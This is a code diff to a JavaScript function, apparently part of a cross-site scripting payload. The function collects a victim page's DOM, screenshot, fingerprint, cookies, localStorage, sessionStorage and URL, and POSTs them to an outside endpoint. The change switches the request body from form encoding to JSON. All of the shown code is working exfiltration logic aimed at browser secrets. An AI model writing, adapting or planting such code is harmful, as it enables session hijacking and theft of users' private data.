@@ -8546,12 +8546,27 @@ async function sendData(baseURL, otherData) {
     callerURL = encodeURIComponent(location.href)
     dom = encodeURIComponent(document.documentElement.innerHTML)
 
-    postData = `dom=${dom}&screenshot=${screenshot}&fingerprint=${fingerprint}&cookies=${cookies}&local_storage=${localStorageEncoded}&session_storage=${sessionStorageEncoded}&origin_url=${callerURL}&${otherData}`
+    otherDataList = otherData.split("&")
+    otherDataDict = {}
+    for (const element of otherDataList){
+        element_splitted = element.split("=")
+        otherDataDict[element_splitted[0]] = element_splitted[1]
+    }
+
+    postData = Object.assign({
+        dom: dom,
+        screenshot: screenshot,
+        fingerprint: fingerprint,
+        cookies: cookies,
+        local_storage: localStorageEncoded,
+        session_storage: sessionStorageEncoded,
+        origin_url: callerURL
+    }, otherDataDict)
 
     request = new XMLHttpRequest()
 
     request.open('POST', baseURL, true)
-    request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')
-    request.send(postData)
+    request.setRequestHeader('Content-type', 'application/json;charset=UTF-8')
+    request.send(JSON.stringify(postData))
 
 }
